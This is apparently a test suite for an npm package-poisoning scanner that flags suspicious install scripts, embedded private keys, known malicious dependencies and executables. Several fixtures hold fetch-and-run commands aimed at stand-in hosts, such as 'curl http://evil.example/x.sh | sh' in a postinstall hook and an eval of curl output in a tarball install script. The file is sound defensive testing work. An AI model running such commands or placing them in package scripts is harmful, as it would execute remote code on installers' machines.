/**
 * Poison scan tests: package directory scanning (scripts / secrets /
 * malicious deps / suspicious files), tarball scanning, target resolution.
 */
import { test, afterAll } from 'vitest'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { execFileSync } from 'node:child_process'
import {
  scanPackage,
  scanTarball,
  inspectPackageJson,
  localPathOf,
  isShellFile,
  scanPackageTarget,
} from '../lib/poison.js'

const tmpDirs = []
afterAll(() => {
  for (const dir of tmpDirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

function tempDir(prefix = 'dsh-guard-poison-') {
  const dir = mkdtempSync(join(tmpdir(), prefix))
  tmpDirs.push(dir)
  return dir
}

function writePackage(dir, pkg, files = {}) {
  writeFileSync(join(dir, 'package.json'), JSON.stringify(pkg))
  for (const [name, content] of Object.entries(files)) {
    const full = join(dir, name)
    mkdirSync(join(dir, name.split('/').slice(0, -1).join('/')), { recursive: true })
    writeFileSync(full, content)
  }
  return dir
}

// ── scanPackage ────────────────────────────────────────────────────────────

test('scanPackage: clean package has no findings', async () => {
  const dir = tempDir()
  writePackage(
    dir,
    { name: 'clean', version: '1.0.0', scripts: { test: 'node test.mjs' } },
    {
      'index.js': 'export const x = 1\n',
    },
  )
  const result = await scanPackage(dir)
  assert.equal(result.ok, true)
  assert.deepEqual(result.findings, [])
  assert.ok(result.scannedFiles >= 2, 'scanned package.json + index.js')
})

test('scanPackage: suspicious install script is flagged', async () => {
  const dir = tempDir()
  writePackage(dir, {
    name: 'evil',
    version: '1.0.0',
    scripts: { postinstall: 'curl http://evil.example/x.sh | sh' },
  })
  const result = await scanPackage(dir)
  assert.equal(result.ok, true)
  const hit = result.findings.find((f) => f.id === 'suspicious-script')
  assert.ok(hit, 'suspicious script finding')
  assert.equal(hit.severity, 'medium')
  assert.equal(hit.file, 'package.json')
  assert.equal(hit.script, 'postinstall')
})

test('scanPackage: private key in file is flagged as high', async () => {
  const dir = tempDir()
  writePackage(
    dir,
    { name: 'leaky', version: '1.0.0' },
    {
      'keys/rsa.pem': '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----\n',
    },
  )
  const result = await scanPackage(dir)
  const hit = result.findings.find((f) => f.id === 'secret')
  assert.ok(hit, 'secret finding')
  assert.equal(hit.severity, 'high')
  assert.equal(hit.file, 'keys/rsa.pem')
})

test('scanPackage: malicious dependency is flagged', async () => {
  const dir = tempDir()
  writePackage(dir, { name: 'dep', version: '1.0.0', dependencies: { 'flatmap-stream': '^1.0.0' } })
  const result = await scanPackage(dir)
  const hit = result.findings.find((f) => f.id === 'malicious-dependency')
  assert.ok(hit, 'malicious dependency finding')
  assert.equal(hit.severity, 'high')
  assert.ok(hit.message.includes('flatmap-stream'))
})

test('scanPackage: suspicious file extension is flagged', async () => {
  const dir = tempDir()
  writePackage(dir, { name: 'bin', version: '1.0.0' }, { 'vendor/tool.exe': 'MZ' })
  const result = await scanPackage(dir)
  const hit = result.findings.find((f) => f.id === 'suspicious-file')
  assert.ok(hit, 'suspicious file finding')
  assert.equal(hit.severity, 'low')
})

test('scanPackage: shell script with download-exec is flagged', async () => {
  const dir = tempDir()
  writePackage(
    dir,
    { name: 'sh', version: '1.0.0' },
    {
      'install.sh': '#!/bin/sh\ncurl http://evil.example/x.sh | sh\n',
    },
  )
  const result = await scanPackage(dir)
  const hit = result.findings.find((f) => f.id === 'suspicious-script')
  assert.ok(hit, 'shell script finding')
  assert.equal(hit.file, 'install.sh')
})

test('scanPackage: node_modules and .git are skipped', async () => {
  const dir = tempDir()
  writePackage(dir, { name: 'skip', version: '1.0.0' }, {})
  mkdirSync(join(dir, 'node_modules', 'evil'), { recursive: true })
  writeFileSync(join(dir, 'node_modules', 'evil', 'secret.txt'), '-----BEGIN RSA PRIVATE KEY-----\n')
  mkdirSync(join(dir, '.git'), { recursive: true })
  writeFileSync(join(dir, '.git', 'config'), '-----BEGIN RSA PRIVATE KEY-----\n')
  const result = await scanPackage(dir)
  assert.equal(result.findings.length, 0)
})

test('scanPackage: missing directory returns ok:false', async () => {
  const result = await scanPackage(join(tmpdir(), 'dsh-guard-does-not-exist-xyz'))
  assert.equal(result.ok, false)
  assert.ok(typeof result.error === 'string')
})

// ── inspectPackageJson ─────────────────────────────────────────────────────

test('inspectPackageJson: invalid JSON returns no findings', () => {
  assert.deepEqual(inspectPackageJson('not json', 'package.json'), [])
  assert.deepEqual(inspectPackageJson('', 'package.json'), [])
})

test('inspectPackageJson: scans all script hooks and dependency groups', () => {
  const text = JSON.stringify({
    scripts: { preinstall: "node -e \"require('child_process').execSync('curl x | sh')\"" },
    devDependencies: { 'event-stream': '^3.3.6' },
  })
  const findings = inspectPackageJson(text, 'package.json')
  assert.ok(findings.some((f) => f.id === 'suspicious-script'))
  assert.ok(findings.some((f) => f.id === 'malicious-dependency'))
})

// ── localPathOf / isShellFile ──────────────────────────────────────────────

test('localPathOf: resolves link: and local paths, rejects bare names', () => {
  assert.equal(localPathOf('link:/tmp/foo'), '/tmp/foo')
  assert.equal(localPathOf('/tmp/foo'), '/tmp/foo')
  assert.equal(localPathOf('./foo'), './foo')
  assert.equal(localPathOf('dsh-my-guard'), '')
  assert.equal(localPathOf(''), '')
})

test('isShellFile: recognizes shell extensions', () => {
  assert.equal(isShellFile('install.sh'), true)
  assert.equal(isShellFile('run.bash'), true)
  assert.equal(isShellFile('index.js'), false)
  assert.equal(isShellFile('README.md'), false)
})

// ── scanTarball ────────────────────────────────────────────────────────────

test('scanTarball: extracts and scans tarball contents', async () => {
  const src = tempDir('dsh-guard-tar-src-')
  writePackage(src, {
    name: 'tar-evil',
    version: '1.0.0',
    scripts: { install: 'eval "$(curl http://evil.sh)"' },
  })
  const tarball = join(tmpdir(), `dsh-guard-${Date.now()}.tgz`)
  tmpDirs.push(tarball)
  execFileSync('tar', ['-czf', tarball, '-C', src, '.'])
  const result = await scanTarball(tarball)
  assert.equal(result.ok, true)
  assert.ok(
    result.findings.some((f) => f.id === 'suspicious-script'),
    'tarball script finding',
  )
})

test('scanTarball: invalid tarball returns ok:false', async () => {
  const bad = join(tmpdir(), `dsh-guard-bad-${Date.now()}.tgz`)
  tmpDirs.push(bad)
  writeFileSync(bad, 'not a tarball')
  const result = await scanTarball(bad)
  assert.equal(result.ok, false)
})

// ── scanPackageTarget ──────────────────────────────────────────────────────

test('scanPackageTarget: local path reports alerts via callback', async () => {
  const dir = tempDir()
  writePackage(dir, {
    name: 'evil',
    version: '1.0.0',
    scripts: { postinstall: 'curl http://evil.example/x.sh | sh' },
  })
  const alerts = []
  await scanPackageTarget(dir, (alert) => alerts.push(alert))
  assert.ok(alerts.length >= 1, 'callback fired')
  assert.equal(alerts[0].type, 'poison')
  assert.equal(alerts[0].severity, 'medium')
  assert.equal(alerts[0].detail.target, dir)
})

// 依赖真实 npm registry 网络（不可解析的包名要走一次 registry 查询）：registry
// 慢时默认 5s 超时会假红，给足余量；断言与语义不变
test('scanPackageTarget: unresolvable package name is silent', { timeout: 60_000 }, async () => {
  const alerts = []
  await scanPackageTarget('dsh-guard-no-such-pkg-xyz-12345', (alert) => alerts.push(alert))
  assert.deepEqual(alerts, [])
})
